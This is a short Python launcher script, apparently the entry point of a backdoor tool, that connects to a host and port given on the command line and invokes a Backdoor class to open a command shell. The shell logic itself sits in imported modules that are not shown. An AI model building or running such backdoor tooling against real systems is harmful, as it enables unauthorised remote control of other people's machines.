#!/bin/usr/python3

from lib.connection import Connection
from lib.cli import CLI
from lib.backdoor import Backdoor


def main():
    cli = CLI()
    
    connection = Connection(cli.ip_addr, cli.port)
    conn = connection.connect()

    backdoor = Backdoor(connection.conn, cli.ip_addr, cli.port, cli.shell_port)
    backdoor.cmd_shell()

    return 0
    

if __name__ == "__main__":
    main()
